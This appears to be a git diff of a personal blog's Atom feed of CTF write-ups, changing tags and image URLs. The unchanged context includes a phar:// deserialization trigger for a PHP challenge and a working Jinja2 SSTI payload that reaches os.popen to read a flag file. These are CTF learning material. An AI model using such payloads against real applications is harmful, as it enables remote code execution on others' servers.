@@ -126,6 +126,18 @@
     <category term="nodejs" />
     <category term="hash_hamc函数" />
     <category term="取反异或" />
+    <category term="misc" />
+    <category term="图片" />
+    <category term="CRC" />
+    <category term="vulhub" />
+    <category term="ActiveMQ" />
+    <category term="javaweb" />
+    <category term="Go" />
+    <category term="sqlmap" />
+    <category term="pydash" />
+    <category term="rust" />
+    <category term="流量分析" />
+    <category term="jpg特征" />
     <entry>
         <id>http://odiws.github.io/2024/10/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-notes/</id>
         <title>[网鼎杯2020青龙组]notes</title>
@@ -325,7 +337,7 @@ public function __wakeup()
 &lt;p&gt;除了 unserialize () 来利用反序列化漏洞之外，还可以利用 phar 文件以序列化的形式存储用户自定义的 meta-data 这一特性，扩大 php 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists ()、is_dir () 等）参数可控的情况下，配合 phar:// 伪协议，可以不依赖 unserialize () 直接进行反序列化操作。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;受影响的函数如下：&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202503052004421.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
 &lt;p&gt;这道题满足这几个条件：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;存在受影响的函数 file_get_contents、file_exists。&lt;/li&gt;
@@ -421,11 +433,11 @@ $phar-&amp;gt;addFromString(&amp;quot;test.txt&amp;quot;, &amp;quot;test&amp;quo
 $phar-&amp;gt;stopBuffering();
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;抓包上传改后缀：&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/wIq9Vx.png&#34; alt=&#34;wIq9Vx&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202503052004422.png&#34; alt=&#34;wIq9Vx&#34;&gt;&lt;/p&gt;
 &lt;p&gt;找到文件路径，通过查看 function.php 可得知文件存在 upload 文件夹内，恰好这个文件夹可以访问 qwq。&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;file.php?file=phar://upload/090b0844ab952f0df2b28e1f9bc24dad.jpg&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/woSN5R.png&#34; alt=&#34;woSN5R&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202503052004423.png&#34; alt=&#34;woSN5R&#34;&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;base64 解码得到 flag&lt;/p&gt;
 &lt;p&gt;出自：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2hhd3Jvb3QuY2MvMTE0MS5odG1s&#34;&gt;https://www.shawroot.cc/1141.html&lt;/span&gt;&lt;/p&gt;
@@ -439,14 +451,14 @@ $phar-&amp;gt;stopBuffering();
         <title>&#39;[RootersCTF2019]I_&lt;3_Flask&#39;</title>
         <link rel="alternate" href="http://odiws.github.io/2024/06/06/[RootersCTF2019]I_3_Flask/"/>
         <content type="html">&lt;h2 id=&#34;rootersctf2019i_️_flask&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rootersctf2019i_️_flask&#34;&gt;#&lt;/a&gt; [RootersCTF2019]I_❤️_Flask&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202503052004658.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
 &lt;p&gt;arjun 工具用于&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202503052004659.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
 &lt;p&gt;这题没有过滤，直接用常规的注入语句即可&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;?name=&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()&#34;) &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;拿到 flag&lt;br&gt;
-&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202503052004660.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
 &lt;p&gt;在该文件同地址的模板是这样的：&lt;/p&gt;
 &lt;p&gt;但是如果是根目录就是：&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;
@@ -467,7 +479,7 @@ $phar-&amp;gt;stopBuffering();
 &lt;p&gt;还可以用 fenjing 直接秒了：&lt;/p&gt;
 &lt;p&gt;使用方法博客上有：&lt;/p&gt;
 &lt;p&gt;直接秒了&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202503052004661.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
 </content>
         <category term="buuctf" />
         <updated>2024-06-06T11:43:07.000Z</updated>
